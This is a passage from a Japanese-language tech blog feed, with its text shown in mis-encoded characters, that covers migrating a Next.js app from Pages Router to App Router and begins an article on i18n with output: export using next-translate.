<h4>ç§»è¡Œå‰ï¼ˆPages Routerï¼‰</h4>
<div class="gatsby-highlight" data-language="tsx"><pre style="counter-reset: linenumber NaN" class="language-tsx line-numbers"><code class="language-tsx"><span class="token comment">// /pages/about.tsx</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> GetStaticProps <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'next'</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">const</span> getStaticProps<span class="token operator">:</span> <span class="token function-variable function">GetStaticProps</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetchSomeData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token punctuation">{</span>
    props<span class="token operator">:</span> <span class="token punctuation">{</span> data <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token function-variable function">AboutPage</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">{</span> data <span class="token punctuation">}</span><span class="token operator">:</span> <span class="token punctuation">{</span> data<span class="token operator">:</span> <span class="token builtin">any</span> <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">About Page</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token punctuation">{</span>data<span class="token punctuation">.</span>message<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> AboutPage<span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h4>ç§»è¡Œå¾Œï¼ˆApp Routerï¼‰</h4>
<div class="gatsby-highlight" data-language="tsx"><pre style="counter-reset: linenumber NaN" class="language-tsx line-numbers"><code class="language-tsx"><span class="token keyword">import</span> <span class="token punctuation">{</span> fetchSomeData <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@/lib/data'</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token function-variable function">AboutPage</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetchSomeData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">About Page</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token punctuation">{</span>data<span class="token punctuation">.</span>message<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> AboutPage<span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h2>ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã®Hooksã‚’ç§»è¡Œã™ã‚‹</h2>
<p>App Routerã§ã¯ã€Pages Routerã§ä½¿ç”¨ã•ã‚Œã¦ã„ãŸã‚‚ã®ã«ä»£ã‚ã‚‹æ–°ã—ã„ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã®HooksãŒå°å…¥ã•ã‚Œã¾ã™ã€‚</p>
<ul>
<li>
<p><code class="language-text">next/router</code>ã‹ã‚‰<code class="language-text">useRouter()</code>ã‚’ä½¿ç”¨ã™ã‚‹ä»£ã‚ã‚Šã«ã€<code class="language-text">next/navigation</code>ã‹ã‚‰<code class="language-text">useRouter()</code>ã€<code class="language-text">usePathname()</code>ã€<code class="language-text">useSearchParams()</code>ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚</p>
</li>
<li>
<p>æ–°ã—ã„Hooksã®<code class="language-text">useRouter()</code> ã¯ã€<code class="language-text">pathname</code>ã¨<code class="language-text">query</code>ã®ãƒ—ãƒ­ãƒ‘ãƒ†ã‚£ã‚’è¿”ã—ã¾ã›ã‚“ã€‚ä»£ã‚ã‚Šã«ã€<code class="language-text">usePathname()</code>ã¨<code class="language-text">useSearchParams()</code>ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚</p>
</li>
</ul>
<h3>ä¾‹2ï¼šãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã®Hooksã®ç§»è¡Œ</h3>
<h4>ç§»è¡Œå‰ï¼ˆPages Routerï¼‰</h4>
<div class="gatsby-highlight" data-language="tsx"><pre style="counter-reset: linenumber NaN" class="language-tsx line-numbers"><code class="language-tsx"><span class="token comment">// /pages/users/[id].tsx</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> useRouter <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'next/router'</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token function-variable function">UserPage</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> <span class="token punctuation">{</span> query <span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token function">useRouter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> userId <span class="token operator">=</span> query<span class="token punctuation">.</span>id <span class="token keyword">as</span> <span class="token builtin">string</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">User Page</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">User ID: </span><span class="token punctuation">{</span>userId<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> UserPage<span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h4>ç§»è¡Œå¾Œï¼ˆApp Routerï¼‰</h4>
<div class="gatsby-highlight" data-language="tsx"><pre style="counter-reset: linenumber NaN" class="language-tsx line-numbers"><code class="language-tsx"><span class="token comment">// /app/users/[id]/page.tsx</span>
<span class="token string">'use client'</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token punctuation">{</span> usePathname<span class="token punctuation">,</span> useSearchParams <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'next/navigation'</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token function-variable function">UserPage</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> pathname <span class="token operator">=</span> <span class="token function">usePathname</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> searchParams <span class="token operator">=</span> <span class="token function">useSearchParams</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> userId <span class="token operator">=</span> searchParams<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">User Page</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">User ID: </span><span class="token punctuation">{</span>userId<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> UserPage<span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>ã‚¨ãƒ©ãƒ¼ãƒãƒ³ãƒ‰ãƒªãƒ³ã‚°ã‚’ã‚¢ãƒƒãƒ—ãƒ‡ãƒ¼ãƒˆã™ã‚‹</h3>
<p>App Routerã§ã¯ã€Pages Routerã¨ã¯ã‚¨ãƒ©ãƒ¼ãƒãƒ³ãƒ‰ãƒªãƒ³ã‚°ã®ã‚¢ãƒ—ãƒ­ãƒ¼ãƒãŒç•°ãªã‚Šã¾ã™ã€‚</p>
<ul>
<li>
<p>ã‚°ãƒ­ãƒ¼ãƒãƒ«ã‚¨ãƒ©ãƒ¼ã®ãƒãƒ³ãƒ‰ãƒªãƒ³ã‚°ã«ã¤ã„ã¦ã¯ã€<code class="language-text">pages/_error.js</code>ãƒ•ã‚¡ã‚¤ãƒ«ã‚’<code class="language-text">app/error.tsx</code>ã«ç½®ãæ›ãˆã¾ã™ã€‚</p>
</li>
<li>
<p>ç‰¹å®šã®ãƒ«ãƒ¼ãƒˆã«é–¢é€£ã™ã‚‹ã‚¨ãƒ©ãƒ¼ã®å‡¦ç†ã®ãŸã‚ã«ãƒšãƒ¼ã‚¸ãƒ•ã‚©ãƒ«ãƒ€å†…ã«å€‹åˆ¥ã®<code class="language-text">error.tsx</code>ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½œæˆã—ã¾ã™ã€‚</p>
</li>
</ul>
<h3>ä¾‹3ï¼šã‚¨ãƒ©ãƒ¼ãƒãƒ³ãƒ‰ãƒªãƒ³ã‚°ã®ç§»è¡Œ</h3>
<h4>ç§»è¡Œå‰ï¼ˆPages Routerï¼‰</h4>
<div class="gatsby-highlight" data-language="jsx"><pre style="counter-reset: linenumber NaN" class="language-jsx line-numbers"><code class="language-jsx"><span class="token comment">// /pages/_error.js</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span> NextPageContext <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'next'</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> <span class="token function-variable function">ErrorPage</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> statusCode <span class="token punctuation">}</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token literal-property property">statusCode</span><span class="token operator">:</span> number <span class="token punctuation">}</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">Error </span><span class="token punctuation">{</span>statusCode<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">An error occurred on the server</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

ErrorPage<span class="token punctuation">.</span><span class="token function-variable function">getInitialProps</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">{</span> res<span class="token punctuation">,</span> err <span class="token punctuation">}</span><span class="token operator">:</span> NextPageContext</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">const</span> statusCode <span class="token operator">=</span> res <span class="token operator">?</span> res<span class="token punctuation">.</span>statusCode <span class="token operator">:</span> err <span class="token operator">?</span> err<span class="token punctuation">.</span>statusCode <span class="token operator">:</span> <span class="token number">404</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token punctuation">{</span> statusCode <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> ErrorPage<span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h4>ç§»è¡Œå¾Œï¼ˆApp Routerï¼‰</h4>
<div class="gatsby-highlight" data-language="tsx"><pre style="counter-reset: linenumber NaN" class="language-tsx line-numbers"><code class="language-tsx"><span class="token comment">// /app/error.tsx </span>
<span class="token comment">// ã‚¨ãƒ©ãƒ¼ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã¯Client Componentã§ã‚ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼</span>
<span class="token string">'use client'</span><span class="token punctuation">;</span>

<span class="token keyword">interface</span> <span class="token class-name">ErrorPageProps</span> <span class="token punctuation">{</span>
  error<span class="token operator">:</span> Error <span class="token operator">&amp;</span> <span class="token punctuation">{</span> digest<span class="token operator">?</span><span class="token operator">:</span> <span class="token builtin">string</span> <span class="token punctuation">}</span>
  <span class="token function-variable function">reset</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token keyword">void</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">const</span> <span class="token function-variable function">ErrorPage</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">{</span> error<span class="token punctuation">,</span> reset <span class="token punctuation">}</span><span class="token operator">:</span> ErrorPageProps<span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">Error</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token punctuation">{</span>error<span class="token punctuation">.</span>message<span class="token punctuation">}</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token plain-text">
      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span>
          <span class="token comment">// ã‚»ã‚°ãƒ¡ãƒ³ãƒˆã®å†ãƒ¬ãƒ³ãƒ€ãƒªãƒ³ã‚°ã«ã‚ˆã‚Šå¾©æ—§ã‚’è©¦ã¿ã¾ã™ã€‚</span>
          <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">reset</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span></span><span class="token punctuation">></span></span><span class="token plain-text">
		Try again
	  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span><span class="token plain-text">
    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> ErrorPage<span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>
<h3>ä»–ã®æ©Ÿèƒ½ã®ç§»è¡Œ</h3>
<p>ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã«ã‚ˆã£ã¦ã¯ã€APIãƒ«ãƒ¼ãƒˆã‚„ãƒŸãƒ‰ãƒ«ã‚¦ã‚§ã‚¢ã€ã‚«ã‚¹ã‚¿ãƒ document/appã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆãªã©ä»–ã®æ©Ÿèƒ½ã‚‚ç§»è¡Œã™ã‚‹å¿…è¦ãŒã‚ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚ã“ã‚Œã‚‰ã®æ©Ÿèƒ½ã‚’App Routerã«ç§»è¡Œã™ã‚‹æ–¹æ³•ã«ã¤ã„ã¦ã¯ã€Next.jsã®ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆã‚’ã”è¦§ãã ã•ã„ã€‚</p>
<h3>ãƒ†ã‚¹ãƒˆã¨æ¤œè¨¼</h3>
<p>ç§»è¡ŒãŒå®Œäº†ã—ãŸã‚‰ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ãƒ†ã‚¹ãƒˆã‚’è¡Œã„ã€ã™ã¹ã¦ã®æ©Ÿèƒ½ãŒæ­£å¸¸ã«å‹•ä½œã™ã‚‹ã“ã¨ã‚’ç¢ºèªã—ã¾ã—ã‚‡ã†ã€‚Pages Routerã¨App Routerã§æŒ™å‹•ã«é•ã„ãŒè¦‹ã‚‰ã‚Œãªã„ã‹æ³¨æ„ã—ã¦ã¿ã¦ãã ã•ã„ã€‚</p>
<p>App Routerã¨Pages Routerã¯åŒã˜Next.jsã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ä¸Šã«å…±å­˜ã§ãã‚‹ãŸã‚ã€æ®µéšçš„ãªç§»è¡ŒãŒå¯èƒ½ã§ã™ã€‚App RouterãŒã¾ã å¯¾å¿œã—ã¦ã„ãªã„ç‰¹å®šã®ãƒ¬ã‚¬ã‚·ãƒ¼æ©Ÿèƒ½ã‚’æ®‹ã™å¿…è¦ãŒã‚ã‚‹å ´åˆãªã©ã«ã¯ã€ãã†ã™ã‚‹ã¨ã‚ˆã„ã§ã—ã‚‡ã†ã€‚</p>
<p><img src="https://www.luckymedia.dev/_next/image?url=https%3A%2F%2Fcms.luckymedia.dev%2Fassets%2Fposts%2Fnext.js-15-release-date.png&#x26;w=3840&#x26;q=75"></p>
<h2>ã¾ã¨ã‚</h2>
<p>Next.jsã®Pages Routerã‹ã‚‰æ–°ã—ã„App Routerã«ç§»è¡Œã™ã‚‹ã“ã¨ã§ã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°æ©Ÿèƒ½ã‚’å¼·åŒ–ã—ã€æŸ”è»Ÿæ€§ã‚’é«˜ã‚ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä¾å­˜é–¢ä¿‚ã‚’ã‚¢ãƒƒãƒ—ãƒ‡ãƒ¼ãƒˆã—ã€ãƒ•ã‚¡ã‚¤ãƒ«æ§‹é€ ã‚’å†æ§‹ç¯‰ã—ã€æ–°ã—ã„ãƒ‡ãƒ¼ã‚¿ãƒ•ã‚§ãƒƒãƒã¨ã‚¨ãƒ©ãƒ¼ãƒãƒ³ãƒ‰ãƒªãƒ³ã‚°ã®æ–¹æ³•ã«é©å¿œã™ã‚‹ã“ã¨ã§ã€App Routerã®æ©Ÿèƒ½ã‚’æœ€å¤§é™æ´»ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚å°‘ã—æ‰‹é–“ã¯ã‹ã‹ã‚Šã¾ã™ãŒã€ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®åŠ¹ç‡æ€§ã¨æ‹¡å¼µæ€§ãŒå‘ä¸Šã™ã‚‹ã“ã¨ã§æ˜ç¢ºãªãƒ¡ãƒªãƒƒãƒˆãŒå¾—ã‚‰ã‚Œã¾ã™ã€‚</p>]]></content:encoded></item><item><title><![CDATA[NextJSã®output: exportã«ã‚ˆã‚‹i18n]]></title><description><![CDATA[ã“ã®è¨˜äº‹ã§ã¯ã€Next.jsã®ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã«ãŠã‘ã‚‹å›½éš›åŒ–å¯¾å¿œï¼ˆi18nï¼‰ã®è¨­å®šæ–¹æ³•ã«ã¤ã„ã¦èª¬æ˜ã—ã¾ã™ã€‚Next.jsãŒç›´æ¥ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ãªã„éƒ¨åˆ†ã®èª²é¡Œã‚’å…‹æœã—ãªãŒã‚‰ã€Pages Routerã‚’ä½¿ç”¨ã—â€¦]]></description><link>https://postd.cc/i18n-with-nextjs-output-export/</link><guid isPermaLink="false">https://postd.cc/i18n-with-nextjs-output-export/</guid><category><![CDATA[é–‹ç™ºæ‰‹æ³•ãƒ»ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆç®¡ç†]]></category><category><![CDATA[Next.js]]></category><pubDate>Mon, 24 Mar 2025 00:00:01 GMT</pubDate><content:encoded><![CDATA[<p>ã“ã®è¨˜äº‹ã§ã¯ã€Next.jsã®ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã«ãŠã‘ã‚‹<strong>å›½éš›åŒ–å¯¾å¿œ</strong>ï¼ˆi18nï¼‰ã®è¨­å®šæ–¹æ³•ã«ã¤ã„ã¦èª¬æ˜ã—ã¾ã™ã€‚<strong>Next.js</strong>ãŒç›´æ¥ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ãªã„éƒ¨åˆ†ã®èª²é¡Œã‚’å…‹æœã—ãªãŒã‚‰ã€Pages Routerã‚’ä½¿ç”¨ã—ã¦i18nã‚’å®Ÿè£…ã™ã‚‹æ–¹æ³•ã¨ã€output: exportã‚’ä½¿ç”¨ã™ã‚‹æ–¹æ³•ã«ã¤ã„ã¦æ¤œè¨ã—ãŸã„ã¨æ€ã„ã¾ã™ã€‚</p>
<div class="admonition admonition-none alert alert--info"><div class="admonition-heading"><h5><span class="admonition-icon"><svg></svg></span>none</h5></div><div class="admonition-content"><p>å›½éš›åŒ–ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã¯ã€Next.jsã®ãƒ«ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ãƒ¬ã‚¤ãƒ¤ãƒ¼ã‚’ä½¿ç”¨ã—ãªã„ãŸã‚<code class="language-text">output: 'export'</code>ã§ã¯å®Ÿè£…ã§ãã¾ã›ã‚“ã€‚<code class="language-text">output: 'export'</code>ã‚’ä½¿ç”¨ã—ãªã„Hybrid Next.jsã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯å®Œå…¨ã«ã‚µãƒãƒ¼ãƒˆã•ã‚Œã¦ã„ã¾ã™ã€‚</p></div></div>
<p>ã¾ãšåˆã‚ã«ã€TypeScriptã‚’ä½¿ç”¨ã—ã¦Next.js v14ã®ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‚’åˆæœŸåŒ–ã—ã¾ã—ã‚‡ã†ã€‚TypeScriptã®ä»£ã‚ã‚Šã«JavaScriptã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚ã©ã¡ã‚‰ã‚‚å•é¡Œãªãä½¿ç”¨ã§ãã¾ã™ã€‚</p>
<h2>NextJSãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã®åˆæœŸåŒ–</h2>
<p>æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã¦ãƒ—ãƒ­ã‚¸ã‚§ã‚¯ãƒˆã‚’ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—ã—ã¦ãã ã•ã„ã€‚ã€‚</p>
<div class="gatsby-highlight" data-language="text"><pre style="counter-reset: linenumber NaN" class="language-text line-numbers"><code class="language-text">`npx create-next-app@latest`</code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span></span></pre></div>
<p>è¨­å®šä¸­ã„ãã¤ã‹è³ªå•ã‚’ã•ã‚Œã¾ã™ãŒã€å¥½ã¿ã§å›ç­”ã—ã¦ãã ã•ã„ã€‚ç­†è€…ã®å ´åˆã¯Pages Routerã‚’é¸æŠã—ã€TypeScriptã§srcãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’æŒ‡å®šã—ã¾ã—ãŸã€‚</p>
<p>æ¬¡ã«ã€next.config.jsãƒ•ã‚¡ã‚¤ãƒ«ã«<code class="language-text">output: "export"</code>ã‚’è¿½åŠ ã—ã¾ã™ã€‚</p>
<p><img src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fffwmsy8pp3fiq4csz80d.png"></p>
<p>ã•ã‚‰ã«ã€<code class="language-text">output: "export"</code>ã®æ§‹æˆã¨ã¯äº’æ›æ€§ãŒãªã„ãŸã‚<code class="language-text">pages</code>ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‹ã‚‰<code class="language-text">api</code>ãƒ•ã‚©ãƒ«ãƒ€ã‚’å‰Šé™¤ã—ã¾ã™ã€‚</p>
<h2>i18nã®ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã¨è¨­å®š</h2>
<p>å›½éš›åŒ–å¯¾å¿œã§ã¯ã€<a href="https://www.npmjs.com/package/next-translate">next-translate</a>ãƒ‘ãƒƒã‚±ãƒ¼ã‚¸ã‚’ä½¿ç”¨ã—ã¾ã™ã€‚æœ¬æ¥ã¯output: exportã«å¯¾å¿œã—ã¦ã„ã¾ã›ã‚“ãŒã€ã”å¿ƒé…ãªãã€‚ãã®ç‚¹ã«ã¤ã„ã¦ã¯å¾Œã»ã©ã‚µãƒãƒ¼ãƒˆã—ã¾ã™ã€‚</p>
